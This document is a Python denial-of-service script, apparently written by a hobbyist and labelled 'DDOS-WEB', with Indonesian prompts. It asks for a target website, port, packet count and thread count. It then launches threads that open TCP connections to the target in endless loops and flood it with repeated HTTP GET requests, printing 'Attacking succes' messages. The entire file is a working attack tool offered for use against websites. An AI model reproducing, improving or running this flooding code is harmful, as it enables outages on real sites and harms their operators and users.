#!bin/python
import sys
import os
import socket
import threading
import random
os.system("clear")

print ("===========\033[0;34m|\033[0;37m DDOS-WEB \033[0;34m|\033[0;37m===========")
print ()
print ("[+] Author by mr cobain.jr")
print ("[+] Ddos for web Tcp")
print ("[+] Using for linux/terminal")
print ("________________>")
print ("\033[0;33m●\033[0;31m Ddos for ucing#")
print ("\033[0;33m●\033[0;31m Web byte tcp#")
print ("\033[0;33m●\033[0;31m Caliboration wan#")
print ()
url = str(input("\033[0;37mmasukan alamat website : "))
port = int(input("masukan port :"))
pack = int(input("pack\t:"))
thread = int(input("thread\t:"))
os.system("clear")

def start():
	hh = random._urandom(100)
	xx = int(0)
	s = b"GET / HTTP/1.1\r\nHost: google.com\r\n\r\n"
	lim = s * 50
	while True:
	           try:
	           	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	           	sock.connect((url, port))
	           	sock.send(lim)
	           	for i in range(pack):
	           		sock.send(lim)
	           	xx +=1000
	           	print ("\033[0;31mAttacking succes!! |", url,"send!! |", xx)
	           	while True:
	           		try:
	           			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	           			sock.connect((url, port))
	           			sock.send(lim)
	           			for i in range(pack):
	           				# pertambahan limit
	           				sock.send(lim)
	           			xx +=1000
	           			print ("\033[0;31mAttacking succes!! |" ,url,"send!! |", xx)
	           		except:
	           			sock.close()
	           			print ("Clear")	         			
	           except:
	           	sock.close()
	           	print ("Done")
	           	
for x in range(thread):
            thread = threading.Thread(target=start)
            thread.start()

start()            
		
